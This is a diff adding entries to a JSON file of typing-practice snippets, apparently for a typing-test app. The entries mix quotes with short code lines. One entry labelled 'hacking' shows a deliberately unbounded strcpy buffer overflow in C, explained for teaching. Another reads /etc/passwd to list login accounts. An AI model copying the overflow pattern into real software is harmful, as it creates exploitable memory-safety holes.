+    "content": "0 3 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1",
+    "attribution": "Scheduling",
+    "language": "shell",
+    "explanation": "A cron entry that logs both streams. Without the redirect, cron mails the output to a mailbox nobody reads."
+  },
+  {
+    "category": "anime",
+    "content": "You should enjoy the little detours to the fullest, because that's where you'll find the things more important than what you want.",
+    "attribution": "Hunter x Hunter"
+  },
+  {
+    "category": "literature",
+    "content": "A throng of bearded men, in sad-colored garments and gray, steeple-crowned hats, intermixed with women, some wearing hoods, and others bareheaded, was assembled in front of a wooden edifice.",
+    "attribution": "Nathaniel Hawthorne, The Scarlet Letter"
+  },
+  {
+    "category": "nature",
+    "content": "In nature nothing exists alone.",
+    "attribution": "Rachel Carson, Silent Spring"
+  },
+  {
+    "category": "shell",
+    "content": "find . -name '*.log' -print0 | xargs -0 grep -l 'ERROR'",
+    "attribution": "Pipelines",
+    "language": "shell",
+    "explanation": "xargs turns a stream of names into arguments. -0 with -print0 is what makes filenames containing spaces safe."
+  },
+  {
+    "category": "movies",
+    "content": "If you could see your whole life laid out in front of you, would you change things?",
+    "attribution": "Arrival (2016)"
+  },
+  {
+    "category": "sysadmin",
+    "content": "awk -F: '$7 !~ /(nologin|false)$/ {print $1, $7}' /etc/passwd",
+    "attribution": "Users",
+    "language": "shell",
+    "explanation": "Accounts with a real login shell, which is the set that can actually sign in."
+  },
+  {
+    "category": "technology",
+    "content": "Simplicity is prerequisite for reliability.",
+    "attribution": "Edsger Dijkstra"
+  },
+  {
+    "category": "hacking",
+    "content": "char buf[64]; strcpy(buf, argv[1]); /* no bound - argv[1] decides the write length */",
+    "attribution": "Memory safety",
+    "language": "clike",
+    "explanation": "The classic overflow: strcpy writes until it finds a NUL, buf holds 64 bytes, and nothing checks which is larger."
+  },
+  {
+    "category": "anime",
+    "content": "Anywhere can be paradise as long as you have the will to live.",
+    "attribution": "Neon Genesis Evangelion"
+  },
+  {
+    "category": "programming",
+    "content": "EXPLAIN ANALYZE SELECT * FROM test_results WHERE mode_key = 'time-30' ORDER BY wpm DESC LIMIT 50;",
+    "attribution": "SQL",
+    "language": "clike",
+    "explanation": "EXPLAIN ANALYZE runs the query and reports what the planner actually did, not what it guessed it would do."
+  },
+  {
+    "category": "programming",
+    "content": "let total: i64 = values.iter().filter(|v| **v > 0).sum();",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "iter() borrows rather than consuming. The double deref is because filter hands you a reference to the iterator's own reference."
+  },
+  {
+    "category": "science",
+    "content": "If I have seen further it is by standing on the shoulders of giants.",
+    "attribution": "Isaac Newton"
   }
 ]
